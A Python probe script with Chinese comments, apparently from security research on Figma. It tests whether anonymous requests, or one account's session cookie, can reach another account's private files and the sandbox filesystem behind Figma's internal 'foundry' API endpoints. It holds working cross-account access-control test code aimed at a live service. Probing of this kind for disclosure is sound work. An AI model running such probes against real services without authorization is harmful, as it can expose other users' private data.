"""foundry 补测2: 两个决定性对照实验
对照1: 匿名 GET /file/A_F2(私有) vs /file/A_MAKE —— 判定匿名200是SPA壳还是真公开
对照2: fs-snapshot 过滤 node_modules, 看 code/ 根目录是否有 Make 应用文件(模板 vs A的数据)
对照3: B 读自己 sandbox 的 code 根目录文件(若存在非模板文件=含A的数据)
"""
import io, json, urllib.request, sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

CK_B = io.open('ws_cookie_B_new.txt', encoding='utf-8').read().strip()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
B_UID = "1667396392129259941"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"
A_F2 = "qzDqStIDJyGbthpKiuvfwg"

def call(label, path, body=None, method="POST", file_key=None, ck=None, uid=None,
         host="https://www.figma.com", timeout=30, raw=False):
    hdrs = {"User-Agent": UA, "Accept": "application/json",
            "Origin": "https://www.figma.com", "Referer": "https://www.figma.com/",
            "Content-Type": "application/json",
            "X-Figma-Org-ID": "", "X-Figma-Team-ID": "",
            "X-Figma-Client-Lifecycle-ID": "probe",
            "Tsid": "probe", "X-Referer-Service": "web"}
    if ck: hdrs["Cookie"] = ck
    if uid: hdrs["X-Figma-User-ID"] = uid
    if file_key: hdrs["X-Figma-File-Key"] = file_key
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(host + path, data=data, headers=hdrs, method=method)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        resp = r.read().decode(errors='replace')
        print(f"[{label}] {r.status}  {len(resp)}B")
        return resp if raw else None
    except urllib.error.HTTPError as e:
        resp = e.read().decode(errors='replace')
        print(f"[{label}] {e.code}  {resp[:200]}")
        return resp if raw else None
    except Exception as e:
        print(f"[{label}] !! {type(e).__name__} {str(e)[:100]}")
        return None

print("======== 对照1: 匿名访问 私有文件 vs Make文件 (判定 SPA壳/真公开) ========")
call("匿名 GET /file/A_F2(私有)", "/file/" + A_F2, method="GET", ck=None)
call("匿名 GET /file/A_MAKE(Make)", "/file/" + A_MAKE, method="GET", ck=None)
# 检查匿名响应内容类型: 是HTML壳还是数据
r_anon = call("匿名 A_MAKE 内容头", "/file/" + A_MAKE, method="GET", ck=None, raw=True)
if r_anon:
    head = r_anon[:600].replace("\n", " ")
    print("  匿名响应头部:", head[:400])
    has_html = "<html" in r_anon[:2000].lower()
    has_og = "og:title" in r_anon[:5000]
    print(f"  含<html>: {has_html}, 含og标签: {has_og}")
    # 找 og:title / title
    import re
    m = re.search(r"<title[^>]*>([^<]+)</title>", r_anon)
    if m: print("  <title>:", m.group(1)[:100])
    m2 = re.search(r'property="og:title"\s+content="([^"]+)"', r_anon)
    if m2: print("  og:title:", m2.group(1)[:100])

print("\n======== 对照2: B 读自己 sandbox(对A_MAKE) 的 code 根目录内容 ========")
r2 = call("B+A_MAKE sandbox", "/api/cortex/foundry/sandbox", {},
          file_key=A_MAKE, ck=CK_B, uid=B_UID, raw=True)
b_sboxd = None
if r2:
    try:
        b_sboxd = json.loads(r2).get("sboxdUrl")
        print("  sboxdUrl:", b_sboxd)
    except Exception as e:
        print("  parse fail", e)

if b_sboxd:
    snap = call("B snapshot(过滤版)", "/api/cortex/foundry/fs-snapshot",
                {"sboxdUrl": b_sboxd, "path": ".", "options": {"listing": "recursive", "content": "none"}},
                file_key=A_MAKE, ck=CK_B, uid=B_UID, raw=True, timeout=45)
    if snap:
        paths = set()
        for line in snap.splitlines():
            line = line.strip()
            if line.startswith("data: "):
                try:
                    ev = json.loads(line[6:])
                    p = ev.get("path")
                    if p: paths.add(p)
                except Exception:
                    pass
        print(f"  总路径数: {len(paths)}")
        # 过滤 node_modules
        non_nm = sorted(p for p in paths if "node_modules" not in p)
        print(f"  非node_modules路径数: {len(non_nm)}")
        for p in non_nm[:80]:
            print(f"    {p}")

print("\n======== 对照3: B fs-read-file 读 code 根目录文件(超时处理: 60s) ========")
if b_sboxd:
    call("B read code/package.json", "/api/cortex/foundry/fs-read-file",
         {"sboxdUrl": b_sboxd, "path": "code/package.json"},
         file_key=A_MAKE, ck=CK_B, uid=B_UID, timeout=60)
    call("B read code/index.css", "/api/cortex/foundry/fs-read-file",
         {"sboxdUrl": b_sboxd, "path": "code/index.css"},
         file_key=A_MAKE, ck=CK_B, uid=B_UID, timeout=60)
